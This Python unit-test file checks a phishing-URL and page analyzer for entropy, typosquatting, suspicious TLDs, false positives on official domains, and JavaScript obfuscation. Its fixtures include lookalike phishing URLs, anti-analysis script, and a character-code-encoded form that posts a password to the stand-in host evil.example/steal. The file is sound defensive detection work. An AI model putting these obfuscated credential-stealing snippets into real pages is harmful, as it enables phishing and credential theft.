import asyncio
import unittest
from app.core.threat_analyzer import ThreatAnalyzer

class TestThreatAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = ThreatAnalyzer()

    def test_shannon_entropy(self):
        # Regular word has lower entropy
        low_entropy = self.analyzer.calculate_entropy("google")
        # Randomized string has high entropy
        high_entropy = self.analyzer.calculate_entropy("x8q9z3m1k94p7")
        self.assertGreater(high_entropy, low_entropy)

    def test_levenshtein_distance(self):
        self.assertEqual(self.analyzer.levenshtein_distance("paypal", "paypa1"), 1)
        self.assertEqual(self.analyzer.levenshtein_distance("microsoft", "rnicrosoft"), 2)
        self.assertEqual(self.analyzer.levenshtein_distance("google", "google"), 0)

    def test_typosquatting_detection(self):
        homoglyph, brand, flags = self.analyzer.check_homoglyphs_and_brands("paypa1-update.com")
        self.assertEqual(brand, "PayPal")
        self.assertTrue(any("Typosquatting" in f or "Leetspeak" in f or "Brand" in f for f in flags))

    def test_ip_domain_detection(self):
        res = self.analyzer.analyze_lexical_url("http://192.168.1.100/login/auth")
        self.assertTrue(res["is_ip_domain"])
        self.assertIn("Direct IP address", " ".join(res["lexical_flags"]))

    def test_suspicious_tld_detection(self):
        res = self.analyzer.analyze_lexical_url("http://security-update-portal.xyz/verify")
        self.assertEqual(res["suspicious_tld"], ".xyz")
        self.assertGreater(res["raw_penalty"], 20)

    def test_legitimate_canonical_domain(self):
        res = self.analyzer.analyze_lexical_url("https://www.paypal.com/signin")
        self.assertFalse(res["homoglyph_detected"])
        self.assertIsNone(res["impersonated_brand"])

    def test_official_brand_sister_domains_not_flagged(self):
        official_urls = [
            "https://gmail.com",
            "https://mail.google.com",
            "https://googlemail.com",
            "https://youtube.com",
            "https://outlook.com",
            "https://live.com",
            "https://icloud.com",
            "https://instagram.com",
            "https://whatsapp.com",
        ]
        for url in official_urls:
            res = self.analyzer.analyze_lexical_url(url)
            self.assertFalse(res["homoglyph_detected"], url)
            self.assertIsNone(res["impersonated_brand"], f"False brand flag on {url}: {res['lexical_flags']}")

    def test_common_word_domains_not_falsely_flagged(self):
        benign_domains = [
            "https://delivery.com",
            "https://laws.com",
            "https://purchase.com",
            "https://pineapple.com",
            "https://email.com",
        ]
        for url in benign_domains:
            res = self.analyzer.analyze_lexical_url(url)
            self.assertIsNone(res["impersonated_brand"], f"False brand flag on {url}: {res['lexical_flags']}")

    def test_brand_impersonation_and_typosquatting_still_flagged(self):
        malicious_cases = [
            ("https://gmail-security-verify.xyz/login", "Google"),
            ("https://google.com.evil-host.xyz/auth", "Google"),
            ("https://gmaillogin.xyz/signin", "Google"),
            ("https://rnicrosoft.com/auth", "Microsoft"),
        ]
        for url, expected_brand in malicious_cases:
            res = self.analyzer.analyze_lexical_url(url)
            self.assertEqual(res["impersonated_brand"], expected_brand, url)

    def test_js_heuristics_avoid_closure_false_positives_and_catch_real_obfuscation(self):
        filler = "x=1;" * 1500
        legit_html = (
            "<html><title>Sign in</title><body>"
            "<script>var ev='keydown';</script>"
            f"<script>D.eval(U.createScript('1'));function f(I){{return eval(I)}}{filler}String.fromCharCode.apply(null,arr);</script>"
            "<script>bb.prototype.preventDefault=function(){};</script>"
            "</body></html>"
        )
        clean_res = asyncio.run(self.analyzer.inspect_live_content(
            "https://accounts.google.com/signin",
            "accounts.google.com",
            prefetched={"final_url": "https://accounts.google.com/signin", "body_text": legit_html},
        ))
        clean_factors = {c["factor"] for c in clean_res["contributions"]}
        self.assertNotIn("obfuscated_js", clean_factors)
        self.assertNotIn("anti_analysis_js", clean_factors)

        evil_html = (
            "<html><body oncontextmenu='return false;'>"
            "<script>eval(unescape('%3cform%3e'));"
            "document.addEventListener('keydown', function(e){if(e.keyCode==123){e.preventDefault();}});</script>"
            "</body></html>"
        )
        evil_charcode_html = (
            "<html><body><script>"
            "document.write(String.fromCharCode("
            + ",".join(str(ord(c)) for c in "<form action='http://evil.example/steal'><input type=password></form>")
            + "));</script></body></html>"
        )
        evil_res = asyncio.run(self.analyzer.inspect_live_content(
            "https://evil-phish.example/login",
            "evil-phish.example",
            prefetched={"final_url": "https://evil-phish.example/login", "body_text": evil_html},
        ))
        evil_factors = {c["factor"] for c in evil_res["contributions"]}
        self.assertIn("obfuscated_js", evil_factors)
        self.assertIn("anti_analysis_js", evil_factors)

        charcode_res = asyncio.run(self.analyzer.inspect_live_content(
            "https://evil-phish.example/charcode",
            "evil-phish.example",
            prefetched={"final_url": "https://evil-phish.example/charcode", "body_text": evil_charcode_html},
        ))
        self.assertIn("obfuscated_js", {c["factor"] for c in charcode_res["contributions"]})

if __name__ == "__main__":
    unittest.main()
